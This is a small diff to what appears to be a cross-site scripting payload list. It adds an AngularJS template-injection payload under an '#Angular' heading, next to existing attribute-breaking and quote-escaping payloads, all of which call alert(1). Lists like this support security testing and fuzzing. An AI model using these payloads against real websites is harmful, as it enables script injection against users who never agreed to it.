@@ -4,3 +4,5 @@
 "onmouseover="alert(1)
 '-alert(1)-'
 '+alert(1)+'
+#Angular
+{{$on.constructor('alert(1)')()}}
